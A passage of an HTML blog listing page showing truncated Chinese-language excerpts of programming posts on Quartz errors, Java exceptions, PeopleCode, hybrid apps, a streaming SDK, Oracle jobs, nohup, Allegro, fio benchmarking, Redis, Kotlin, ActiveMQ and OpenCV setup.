			org.quartz.JobPersistenceException: Couldn&#39;t retrieve trigger: Table &#39;leo_quartz.QRTZ_TSSDRS&#39; does
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'schedulerFactoryBean' defined in class path resource [cn/leopard/service/quartz/SchedulerConfig.class]: Invocat ion of init method failed; nested exception is org.quartz.JobPersistenceException: Couldn't retrieve trigger: Table 'leo_quartz.QRTZ_TSSDRS' doesn't exist [See nested exception: com.mysql.jdbc.excep tions.jdbc4.MySQLSyntaxErrorException: Table 'leo_quartz.QRTZ_TSSDRS' doesn't exist] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1628) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:555) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:742) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:866) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:542) at org.springframework.boot.context.embedded.EmbeddedWebApplicationContext.refresh(EmbeddedWebApplicationContext.java:122) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:737) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:370) at org.springframework.boot.SpringApplication.run(SpringApplication.java:314) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1162) at org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8d64f8d5afe03e2d5446e8f3595fe9b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6daa5231038a311c7100a07ec7b1beaf/" rel="bookmark">
			Java Web开发常见异常及排查方法记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		突然想写一篇博客，记录下java web开发常见异常及排查方法（持续更新，想到就会添加）
先简单讲一下异常的分类
所有异常的根类是Throwable。直接继承自Throwable的是Error和Exception。Error表明发生的是严重的错误，程序很难处理和恢复的错误，比如OutOfMemoryError（内存溢出）。而Exception则要分两种，一种是受检异常，如果一个方法声明了会抛某个受检异常的话，IDE就会提示你必须用捕获这个异常进行处理，或者在方法上声明会抛异常，把异常再抛向上层，还有一种是非受检异常，即继承了Exception的直接子类RuntimeException的异常，如NullPOinterException，明明方法没有声明会抛异常，但运行时还是可能会抛这些非受检异常，而即使声明会抛非受检异常，IDE也不会提示一定要捕获或声明向外抛这些异常。
下面就介绍下java开发中常见的异常:
1、NullPointerException，差不多算是最常见的异常了，也是比较好排查的，基本上看异常栈最上面一行，提示的代码行数，找到对应行，然后在那行上找调用了哪些对象的方法或访问了哪些对象的实例属性，这些对象就是可能报空指针的引用了，然后可以单步调试，看停到这行代码上，看哪个对象是空，如果不方便本地调试，就可以加些输出语句，在报错语句前把可能为空的对象都打出来看哪个输出是null
2、ArrayIndexOutOfBoundsException，也是比较常见的异常，特别是初学数组时，这个异常也比较好排查解决的，就是数组越界了，要么访问的序号&lt;0了，要么&gt;=数组的长度了，看异常栈定位到报错的具体行数，然后就很容易解决这个错误了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed59aa3a70ddb96f64c54070b92a897d/" rel="bookmark">
			PeopleSoft技术（PeopleCode学习1）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本片文章主要讲一些PeopleCode的基础知识，后面会有PeopleCode练习的篇章
一、PeopleCode概述 当业务数据自身的约束不能满足业务需求时，使用PeopleCode实现复杂的业务逻辑当业务数据的保存逻辑过于复杂，无法通过Component Processing实现时，使用PeopleCode＋SQL实现复杂的数据保存逻辑PeopleCode Definition是存放在数据库中的事件（Event）驱动，面向操作（用户的业务处理）的编程语言 二、PeopleCode对象和事件 （1）PeopleCode中的对象 Record Field Component Record Field Component Record Component Page Menu Item 几乎用不到 注意：我们在写代码的时候优先级是从下往上的，可以在Component Record中写的不在Record中写，因为如果你把Code写在Record中，别人用这个Record时也会执行该Code，除非你的Code在所有用到这个Record时都可以用到，否则不建议使用。
（2）PeopleCode中的事件 （a）下面是PeopleCode中的所有事件 （b）下面是用户更改FIELD后触发的事件顺序 （c）用户点击Save按钮时触发的事件顺序 （d）FieldEdit VS FieldChange FieldEdit比FieldChange先触发，并且是所有Field的FieldEdit事件触发完之后才触发FieldChange事件 一边情况，数据校验类型的code会放在FieldEdit事件中去写，按钮点击等方法会在FieldChange事件中去写。 FieldEdit事件会根据代码执行情况对当前字段进行特殊标记 （e）SaveEdit VS SavePreChange VS SavePostChange 触发的顺序是SaveEdit&gt;&gt;SavePreChange&gt;&gt;SavePostChange，并且是所有Field的某个事件都触发完之后再触发下一个事件 SaveEdit一般是在保存前字段信息校验时写在该事件中；SavePreChange保存在数据库之前进行数据合法性校验，比如已有该员工身份证号则不能录入；SavePostChange一般是保存到数据库之后触发，比如保存到数据库后给用户一个友好型提示。
三、PeopleCode语法 分隔符：PeopleCode和大多数编程语言一样都是用分号(;)结束的 赋值语句：Varname = expression 数据声明：数据范围 数据类型 变量名 例如：
Local number &amp;NUM; Local Field &amp;DATE; Local array of number &amp;AN； 条件语句：
if 条件 then 语句; end-if; Evaluate left_term When [relop_1] right_term_1 [statement_list] .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed59aa3a70ddb96f64c54070b92a897d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25e585767a2f22709081d5bbf10d4c49/" rel="bookmark">
			Hybird APP （混合开发）简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写了几个 APP，最初是打算用纯 Native 的，可是我自身的 Android、IOS 知识并不能支撑我用纯 Native 构建项目，可项目又迫在眉睫。还好有前辈指点了一下，可以采用 Hybrid APP（混合开发），一路磕磕绊绊的完成了项目。看了不少资料，从菜鸟的角度来总结下 Hybrid APP（混合开发）
概述 Hybrid App（混合模式移动应用）是指介于 Web App（套壳）、Native App（原生）这两者之间的 app ，兼具“ Native App 良好用户交互体验的优势 ”和“ Web App 跨平台开发的优势 ”。
也就是说，Hybrid App 是运用既包含类似移动端浏览器打开网站的相关技术，又包含原生应用调取底层接口（摄像头、传感器等等）的相关技术开发出来的应用。
分类 依照 HTML 代码的占比可以对 Hybrid App 进行划分。
80% ~ 100% 这个方案的主要工作量在于写一个兼容性好的H5页面，包括分辨率、性能、浏览器支持等问题。如果对于分别多平台（不光iOS、Android，可能还有移动网页版和微信公众平台）做Native应用来说，肯定总成本是低的。
选择这个方案的好处是如果能一套H5代码搞定多平台的话相当省时省力。如果H5代码写的好的话，其实在主流机型上的适配和体验也都过得去。
这个方案的缺点也很明显，在低配机上性能很差，如果H5代码写的不好，兼容性问题一堆，功能、安全性也受到很大的限制。
但随着Native APP开发的成本逐年提高，预算有限情况下，选择这种方式做开发的公司也是有的。当然，还有种情况是本来公司做APP只是为了交差，成本越低越好，这和十年前每个单位基本都必须有一个网站，结果诞生了无数奇葩网站的情况一样。
40% ~ 80% 应用中包含了Native代码，并且实现了部分H5体验不好、或者难以实现的逻辑（比如定位、埋点、本地持久存储、体感等）。有些情况下，程序的底层框架、核心逻辑、界面框架也会用Native来完成，H5只用来实现业务逻辑，H5代码占比在40%~80%左右。
制作这样的APP，一般会用到一个Hybrid框架来做bridge，同时也不用自己去做JSApi。市面上的框架实在太多，主流的几个上面也提到了，wex5、bootstrap和cordova等。我也不想花时间去比较各自的好坏，因为这类文章网上已经很多了，而且框架变化太快，值得注意的是在选择开源库的时候，要选一个社区活跃、更新比较及时比较好。剩下的需要Native实现的业务逻辑、tab+navigation界面等，自己稍微做一下就行了。
这个方案的好处是比较兼顾开发成本、跨平台和体验。如果业务的H5代码使用在线地址的话，其实就可以做到很大程度的内容动态化。再深入一点的话，在本地缓存一下JS和Resource，甚至做一个差量更新系统，其实流量也不会太厉害。
这个方案的局限性还是在于用户体验和性能，在低端机型上，H5的性能不是一个好的框架可以弥补的。同时，开发时间来说，这样的方式比起全Native优势不大，主要的好处在于做到最简单的动态化而非成本。
大量的传统行业+外包开发的APP采用的是这样的模式，比如人人都会用到的手机银行。这样的模式比较适合业务比较稳定、同时容易抽象的系统，对于乙方来说，比较能够复用已有的技术方案，对于甲方来说，对体验、交互创新没太多需求，业务结构稳定，但单个业务变化很快，使用这样的方式，其实是很适合的。
20% ~ 40% 这类实现方式，和上一类的区别在于，它针对不同的业务场景使用了不同的技术方案。如果是业务复杂、用户使用频繁、体验要求高的业务模块，就使用Native开发；如果是用户较少，体验要求不高，但变化频繁的业务模块，使用H5进行开发。
这种编码方式其实能玩出很多花活，比如资源足够情况下可以对某些模块即做Native也做H5版本，通过服务端下发Router指定打开哪一个，这样一方面可以做A/B testing，另一方面也可以在Native代码出错时做failback。
至于劣势么，主要在于整个APP的复杂性，和对于多类型业务模块的兼容、信息传递等。开发成本在这个时候，甚至已经大于纯Native应用了。
业内很多大型APP使用的都是这种方式，比如Ctrip，Alipay等。
0% ~ 20% 第四类应用理论上讲已经不太能归类到Hybrid开发的范畴了。这类应用使用了页面动态化框架，可以让Native通过执行动态化的脚本（可以本地也可以下发），但渲染出Native的界面和逻辑。最出名的框架就是Facebook的React Native了，当然，每个大厂都会有自己造的轮子，比如阿里系的Weex，但影响力比起RN都小了一点…
这类技术方案是现在移动客户端的技术热点之一，很多高级工程师和专家级别的从业人士都花了大量的时间使用、改进、设计这样的方案来兼顾性能、开发成本和动态化，从今天看来，还没有一个很完美的解决方案。
使用（或者说试水）这样方式做开发的厂商已经很多很多了，这里就不举例了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/25e585767a2f22709081d5bbf10d4c49/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ccf93d66a815f6832c3931fa85b42bde/" rel="bookmark">
			大牛直播SDK-Windows推送端使用说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于大牛直播SDK Demo主要侧重于SDK接口展示，庞大的功能让好多使用者望而却步，以下是Windows推送端SDK简单的介绍：
大牛直播SDK推送端提供C++/C#两套接口，对外提供32/64位库。
我们不一样： 大牛直播SDK自有框架，易于扩展，自适应算法让延迟更低、采集编码传输效率更高；所有功能以SDK接口形式提供，所有状态，均有event回调，完美支持断网自动重连；SDK模块化，可和大牛直播播放器SDK组合实现流媒体数据转发、连麦、一对一互动等场景；推送叠加以层级模式提供，开发者可以自行组合数据源(如多摄像头/屏幕/水印叠加)；支持外部YUV/RGB/H.264/AAC/SPEEX/PCMA/PCMU数据源接入；所有参数均可通过SDK接口单独设置，亦可通过默认参数，傻瓜式设置；推送、录像模块完全分离，可单独使用亦可组合使用；业内甚至很难找到效果接近的SDK可以PK。 使用说明： 视频采集设置： 问题[确认数据源]：采集桌面还是摄像头？如果桌面，全屏还是部分区域？
回答：
如果是摄像头：可以选择摄像头列表，然后分辨率、帧率。 如果是屏幕：默认帧率是5帧，可以根据实际场景调整，选取屏幕区域，可以实时拉取选择需要采集或录像区域； 如果是叠加模式：可选择摄像头叠加到屏幕，还是屏幕叠加到摄像头；更高需求的用户，可以设置水印或应用层遮盖。 问题：如果是摄像头，采集到的摄像头角度不对怎么办？
回答：我们支持摄像头镜像和翻转设置，摄像头可通过SDK接口轻松实现水平/垂直翻转、镜像效果。
码率设置： 问题[设置码率]：自己设置码流还是用我们推荐值？
回答：
选择使用平均码率，关键帧间隔一般设置到屏幕或摄像头设置帧率的2~5倍(如帧率15，关键帧间隔可以设置到60)，默认可以2倍，码率如果是专业用户，可以自行设定，如果是普通用户，可以点击“获取默认值”，拿到大牛直播SDK推荐的码率。
NOTE：点击“推送”或“录像”之前，一定设置码率，如不想手动设置，请点击“获取默认值”！！！
音频采集设置： 问答式：采集音频吗？如果采集，采集麦克风还是扬声器的，亦或混音？
回答：
如果想采集电脑输出的音频（比如音乐之类），可以选择“采集扬声器”；如果想采集麦克风音频，可以选择“采集麦克风”，并选择相关设备；如果两个都想采集，可以两个都选择，混音输出。 音频编码： 问题：是AAC还是SPEEX？
回答：我们默认是AAC编码模式，如果需要码率更低，可以选择SPEEX编码模式，码率更低。
音频处理： 问题：我想过滤背景噪音怎么办？
回答：选中“噪音抑制”。
问题：我想做一对一互动怎么办？
回答：选中“回音消除”。
问题：我推送或者录像过程中，随时静音怎么办？
回答：推送过程中，随时选择或取消选择“静音”功能。
推送： 问题：我想同时推送到多个url怎么办(比如一个内网服务器，一个外网服务器)？
回答：同时填写多个url，然后点推送即可。
截图： 问题：我想推送或者录像过程中，截取当前图像怎么办？
回答：那就设置好截图路径，推送或录像过程中，随时点击“截图”。
录像： 问题：我还想录像，怎么办？
回答：设置录像文件存放目录，文件前缀、单个文件大小，是否加日期、时间，随时录制即可。
功能列表： windows屏幕截取/摄像头推送录像
视频源相关： [屏幕/摄像头]支持帧率、关键帧间隔、码率、编码profile、编码速度等设置； [屏幕]支持屏幕裁剪，根据帧率和推送分辨率，自动推荐码流； [摄像头]支持摄像头选择、分辨率设置、帧率设置； [扩展数据]支持外部H.264接口输入； 音频源相关 [音频]采集麦克风； [音频]采集扬声器； [扩展数据]AAC, Speex WB, PCMA, PCMU数据接口输入； 摄像头和屏幕合成 [摄像头和屏幕实时切换]支持推送过程中，摄像头和屏幕互相切换，单画面显示摄像头或屏幕； [摄像头叠加到屏幕] 支持摄像头按照设置坐标，叠加到屏幕指定位置，并支持实时关闭叠加层； [屏幕叠加到摄像头] 支持屏幕按照设定坐标，叠加到摄像头指定位置，并支持实时关闭叠加层； 水印和透明度遮挡 [实时水印]支持动态水印设置，完美支持文字水印、实时时间水印和图片水印； [透明度]可以设置透明度处理（设置遮盖）； 音频合成 [音频]支持扬声器和麦克风音频混音输出(同时选择“采集扬声器”和“采集麦克风”)； 音频处理 [音频]支持音频“端点检测（VAD）”，自适应码流，音频码流更节省； [音频]支持回音消除功能（一对一功能：可通过在两台windows机器同时开启daniulive的推送和播放端demo，相互推送播放测试）； [音频]支持噪音抑制功能； [音频]支持自动增益控制； 音视频推送类型选择 [视频]支持推送H.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ccf93d66a815f6832c3931fa85b42bde/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ca4ec4ed2f328c3481970f7b37e6228/" rel="bookmark">
			ORACLE定时任务没有执行原因
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 ORACLE定时任务没有执行原因 这个问题研究了挺长时间， 从最开始写ORACLE存储过程 create or replace procedure ... 写定时任务 dbms_job.submit(...) 执行定时任务 dbms_job.run(job num) 如果以上三部分都没有报错，可存储过程没有执行出来特定的结果，可以考虑是不是因为ORACLE默认的定时任务执行范围设置太小了， 首先查看一下你执行的定时任务的job num 是多少， select * from user_jobs 然后再查看一下执行任务的job 的临界值是多少，一般都比较小 看select value from v$parameter where name like '%job_queue_processes%' ，的值是多少 最后如果是这个原因造成的话，直接把这个临界值修改大点，改成100就OK了， 如果job数量超过10，第11个就不会执行了 alter system set job_queue_processes =100; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf0f5418eb0d106a63c52147bced833c/" rel="bookmark">
			Linux后台运行Jar方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 原文地址：http://blog.csdn.net/c1481118216 https://blog.csdn.net/c1481118216/article/details/53010963
在linux服务器上运行Jar文件时通常的方法是： $ java -jar test.jar 1 这种方式特点是ssh窗口关闭时，程序中止运行.或者是运行时没法切出去执行其他任务，有没有办法让Jar在后台运行呢：方法一： $ nohup java -jar test.jar &amp; //nohup 意思是不挂断运行命令,当账户退出或终端关闭时,程序仍然运行 //当用 nohup 命令执行作业时，缺省情况下该作业的所有输出被重定向到nohup.out的文件中 //除非另外指定了输出文件。 12345 方法二： $ nohup java -jar test.jar &gt;temp.txt &amp; //这种方法会把日志文件输入到你指定的文件中，没有则会自动创建 123 jobs命令和 fg命令： $ jobs //那么就会列出所有后台执行的作业，并且每个作业前面都有个编号。 //如果想将某个作业调回前台控制，只需要 fg + 编号即可。 $ fg 2 1234 查看某端口占用的线程的pid netstat -nlp |grep :8080 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c25f1769b18a6118fef166ae7b365531/" rel="bookmark">
			Cadence Allegro导网表的错误问题解决（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Allegro导入网表的时候，有时候会出现这样一个错误问题，如下:
—— Oversights/Warnings/Errors ——
#1 ERROR(SPMHNI-235): Error detected saving design. ERROR(SPMHNI-234): Cannot write drawing, '#Taaaaaa01496.tmp' out to the directory: 'VOIDs are not allowed in the parent SHAPE.'. #2 Run stopped because errors were detected 具体如下： 其中，’#Taaaaaa01496.tmp’不一定就是这个文件名字，也可能是其他的（貌似是随机产生的名字）。
碰到这个问题如何解决呢？可以尝试如下过程进行解决： 1、在导入网表之前，在Allegro中先进行如下操作：
点击Database Check，然后出现如下窗口：
勾上Update all DRC，然后Check（第一次Check时可能会弹出Log窗口显示一些错误，不用理会，第二次Check就没有了），完成后Close。
2、完成以上操作后，再重新导入网表，就不会出现之前的那种错误了。
通常，这种错误容易出现在多人设计的过程中，在其他人的软件中操作没有问题，但是由于软件设置、操作等的不同，到了自己的软件中可能就会出现问题，所以需要更新一下。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1028879bdc7bf00c440e1c26e5a832d5/" rel="bookmark">
			fio工具测试硬盘性能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		云硬盘的性能如何衡量？一般使用以下几个指标对存储设备的性能进行描述：
IOPS：每秒读/写次数，单位为次（计数）。存储设备的底层驱动类型决定了不同的 IOPS。 吞吐量：每秒的读写数据量，单位为MB/s。 时延：IO操作的发送时间到接收确认所经过的时间，单位为秒。 FIO是测试磁盘性能的一个非常好的工具，用来对硬件进行压力测试和验证。建议使用libaio的I/O引擎进行测试，请自行安装FIO和Libaio。
请特别注意： 1. 请不要在系统盘上进行 fio 测试，避免损坏系统重要文件 2. fio测试建议在空闲的、未保存重要数据的硬盘上进行，并在测试完后重新制作文件系统。请不要在业务数据硬盘上测试，避免底层文件系统元数据损坏导致数据损坏 2. 测试硬盘性能时，推荐直接测试裸盘（如 vdb）；测试文件系统性能时，推荐指定具体文件测试（如 /data/file） 安装libaio、fio apt install -y libaio-dev wget http://brick.kernel.dk/snaps/fio-2.1.7.tar.gz cd fio-2.1.7/ ./configure make make install 不同场景的测试公式基本一致，只有3个参数（读写模式，iodepth，blocksize）的区别。下面举例说明使用block size为4k，iodepth为1来测试顺序读性能的命令。
4k随意读测试iops 命令如下：
fio --bs=4k --ioengine=libaio --iodepth=1 --direct=1 --rw=read --time_based --runtime=600 --refill_buffers --norandommap --randrepeat=0 --group_reporting --name=fio-read --size=50G --filename=/dev/vdb1 每个工作负载适合的最佳iodepth不同，具体取决于您的特定应用程序对于 IOPS 和延迟的敏感程度。
参数说明：
常见用例如下：
block=4k iodepth=1 随机读测试，能反映磁盘的时延性能； block=128K iodepth=32 能反映峰值吞吐性能 ; block=4k iodepth=32 能反映峰值IOPS性能。 下图为SSD云硬盘的测试性能截图：
——————————————————————————— 另一种简单的测试方法 4k随机读写iops测试、512k顺序读写吞吐量测试 利用配置文件，此处的fio.conf是自己编写的脚本文件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1028879bdc7bf00c440e1c26e5a832d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15902b1c50a25f5767540609395309cd/" rel="bookmark">
			Redis在实际项目中的应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		想起自己以前想把Redis整合到JavaWeb项目中，网上搜了很多教程都不全面，现在我终于弄明白了，所以想在这分享一下。
1.Redis的安装 我这里就不讲了，网上有很多教程，windows,Linux,我自己的是搭建在服务器上的。 图形化连接
向业务逻辑中添加缓存
1.1. 接口封装 常用的操作redis的方法提取出一个接口，分别对应单机版和集群版创建两个实现类。
1.1.1. 接口定义 ##jedisClient
package cn.e3mall.common.jedis; import java.util.List; public interface JedisClient { String set(String key, String value); String get(String key); Boolean exists(String key); Long expire(String key, int seconds); Long ttl(String key); Long incr(String key); Long hset(String key, String field, String value); String hget(String key, String field); Long hdel(String key, String... field); Boolean hexists(String key, String field); List&lt;String&gt; hvals(String key); Long del(String key); } ###JedisClientPool
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15902b1c50a25f5767540609395309cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac494924c207e1f4a244b8f207da9060/" rel="bookmark">
			浅谈Kotlin语法篇之扩展函数(五)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简述: 今天带来的是Kotlin浅谈系列的第五弹，这讲主要是讲利用Kotlin中的扩展函数特性让我们的代码变得更加简单和整洁。扩展函数是Kotlin语言中独有的新特性，利用它可以减少很多的样板代码，大大提高开发的效率；此外扩展函数的使用也是非常简单的。我会从以下几个方面阐述Kotlin中的扩展函数。
1、为什么要使用Kotlin中的扩展函数?2、怎么去使用扩展函数和扩展属性？3、什么是扩展函数和属性？4、扩展函数和成员函数区别5、扩展函数不可以被重写 一、为什么要使用Kotlin中的扩展函数 我们都知道在Koltin这门语言可以与Java有非常好的互操作性，所以扩展函数这个新特性可以很平滑与现有Java代码集成。甚至纯Kotlin的项目都可以基于Java库，甚至Android中的一些框架库，第三方库来构建。扩展函数非常适合Kotlin和Java语言混合开发模式。在很多公司一些比较稳定良好的库都是Java写，也完全没必要去用Kotlin语言重写。但是想要扩展库的接口和功能，这时候扩展函数可能就会派上用场。使用Kotlin的扩展函数还有一个好处就是没有副作用，不会对原有库代码或功能产生影响。先来看下扩展函数长啥样
给TextView设置加粗简单的例子 //扩展函数定义 fun TextView.isBold() = this.apply { paint.isFakeBoldText = true } //扩展函数调用 activity.find&lt;TextView&gt;(R.id.course_comment_tv_score).isBold() 复制代码 二、怎么去使用扩展函数和扩展属性 1、扩展函数的基本使用 只需要把扩展的类或者接口名称，放到即将要添加的函数名前面。这个类或者名称就叫做接收者类型，类的名称与函数之间用"."调用连接。this指代的就是接收者对象，它可以访问扩展的这个类可访问的方法和属性。
注意: 接收者类型是由扩展函数定义的，而接收者对象正是这个接收者类型的对象实例，那么这个对象实例就可以访问这个类中成员方法和属性，所以一般会把扩展函数当做成员函数来用。
2、扩展属性的基本使用 扩展属性实际上是提供一种方法来访问属性而已，并且这些扩展属性是没有任何的状态的，因为不可能给现有Java库中的对象额外添加属性字段，只是使用简洁语法类似直接操作属性，实际上还是方法的访问。 //扩展属性定义 var TextView.isBolder: Boolean get() {//必须定义get()方法，因为不能在现有对象添加字段，也自然就没有了默认的get()实现 return this.paint.isFakeBoldText } set(value) { this.paint.isFakeBoldText = value } //扩展属性调用 activity.find&lt;TextView&gt;(R.id.course_comment_tv_score).isBolder = true 复制代码 注意:
扩展属性和扩展函数定义类似，也有接收者类型和接收者对象，接收者对象也是接收者类型的一个实例，一般可以把它当做类中成员属性来使用。
必须定义get()方法，在Kotlin中类中的属性都是默认添加get()方法的，但是由于扩展属性并不是给现有库中的类添加额外的属性，自然就没有默认get()方法实现之说。所以必须手动添加get()方法。
由于重写了set()方法，说明这个属性访问权限是可读和可写，需要使用var
三、什么是扩展函数和属性 我们从上面例子可以看出，kotlin的扩展函数真是强大，可以毫无副作用给原有库的类增加属性和方法，比如例子中TextView，我们根本没有去动TextView源码，但是却给它增加一个扩展属性和函数。具有那么强大功能，到底它背后原理是什么？其实很简单，通过decompile看下反编译后对应的Java代码就一目了然了。
1、扩展函数实质原理 扩展函数实际上就是一个对应Java中的静态函数，这个静态函数参数为接收者类型的对象，然后利用这个对象就可以访问这个类中的成员属性和方法了，并且最后返回一个这个接收者类型对象本身。这样在外部感觉和使用类的成员函数是一样的。
public final class ExtendsionTextViewKt {//这个类名就是顶层文件名+“Kt”后缀，这个知识上篇博客有详细介绍 @NotNull public static final TextView isBold(@NotNull TextView $receiver) {//扩展函数isBold对应实际上是Java中的静态函数，并且传入一个接收者类型对象作为参数 Intrinsics.checkParameterIsNotNull($receiver, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac494924c207e1f4a244b8f207da9060/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08a2a78ede95134ec0bce24bcd6fa192/" rel="bookmark">
			消息队列ActiveMQ-（入门篇简单易懂）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近遇到一个问题：
我们如何同步solr的索引库，那这牵连到服务与服务之间的调用。
方案一：添加商品的业务逻辑中，添加一个同步索引库的业务逻辑。
缺点：业务逻辑耦合度高，业务拆分不明确
方案二：业务逻辑在taotao-search中实现，调用服务在taotao-manager实现。业务逻辑分开。
缺点：服务之间的耦合度变高。服务的启动有先后顺序。
方案三：使用消息队列。MQ是一个消息中间件。
ActiveMQ MQ是一个消息中间件，ActiveMQ、RabbitMQ、kafka
1.1. 什么是ActiveMQ ActiveMQ 是Apache出品，最流行的，能力强劲的开源消息总线。ActiveMQ 是一个完全支持JMS1.1和J2EE 1.4规范的 JMS Provider实现,尽管JMS规范出台已经是很久的事情了,但是JMS在当今的J2EE应用中间仍然扮演着特殊的地位。
主要特点：
1. 多种语言和协议编写客户端。语言: Java, C, C++, C#, Ruby, Perl, Python, PHP。应用协议: OpenWire,Stomp REST,WS Notification,XMPP,AMQP
2. 完全支持JMS1.1和J2EE 1.4规范 (持久化,XA消息,事务)
3. 对Spring的支持,ActiveMQ可以很容易内嵌到使用Spring的系统里面去,而且也支持Spring2.0的特性
4. 通过了常见J2EE服务器(如 Geronimo,JBoss 4, GlassFish,WebLogic)的测试,其中通过JCA 1.5 resource adaptors的配置,可以让ActiveMQ可以自动的部署到任何兼容J2EE 1.4 商业服务器上
5. 支持多种传送协议:in-VM,TCP,SSL,NIO,UDP,JGroups,JXTA
6. 支持通过JDBC和journal提供高速的消息持久化
7. 从设计上保证了高性能的集群,客户端-服务器,点对点
8. 支持Ajax
9. 支持与Axis的整合
10. 可以很容易得调用内嵌JMS provider,进行测试
1.2. ActiveMQ的消息形式 对于消息的传递有两种类型：
一种是点对点的，即一个生产者和一个消费者一一对应；(queue)
另一种是发布/订阅模式，即一个生产者产生消息并进行发送后，可以由多个消费者进行接收。(topic)
JMS定义了五种不同的消息正文格式，以及调用的消息类型，允许你发送并接收以一些不同形式的数据，提供现有消息格式的一些级别的兼容性。
· StreamMessage -- Java原始值的数据流
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/08a2a78ede95134ec0bce24bcd6fa192/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86a77a39cce15fa83c3d44df9b28df48/" rel="bookmark">
			VC6.0与OpenCV1.0 的安装和配置，及相关可能出现的错误与解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本人机器：Win10 X64 一、安装Visual C++ 6.0 这个网上教程很多，我就不赘述了。
二、安装OpenCV 1.0
1.下载链接：http://wiki.opencv.org.cn/index.php/Download 2.安装路径：我的都是按默认路径安装的，即将OpenCV安装到C:\Program Files(x86)\OpenCV
3.在安装时选择"将\OpenCV\bin加入系统变量"（Add\OpenCV\bin to the systerm PATH）（如下图：）
注意：检查C:\Program Files（x86)\OpenCV\bin是否已经被加入到环境变量PATH，如果没有，请加入。加入后需要注销当前Windows用户（或重启）后重新登陆才生效。(可以在任务管理器里重启explorer.exe)
三、环境配置
1.全局设置
菜单Tools-&gt;Options（选项）-&gt;Directories（目录）：先设置lib路径，选择Library files，在下方填入路径： C:\Program Files(x86)\OpenCV\lib 然后选择include files，在下方填入路径：
C:\Program Files(x86)\OpenCV\cxcore\include C:\Program Files(x86)\OpenCV\cv\include C:\Program Files(x86)\OpenCV\cvaux\include C:\Program Files(x86)\OpenCV\ml\include C:\Program Files(x86)\OpenCV\otherlibs\highgui C:\Program Files(x86)\OpenCV\otherlibs\cvcam\include 最后点击“正确”，完成设置。
2.项目设置 每创建一个将要使用OpenCV的VC Project，都需要给它指定需要的lib。菜单：Project-&gt;Settings，然后将Setting for选为All Configurations，然后选择右边的link标签，在Object/library modules附加上
cxcore.lib cv.lib ml.lib cvaux.lib highgui.lib cvcam.lib 四、测试
1.新建工程test：
2.代码（网上找的），如下：
#include "cv.h"
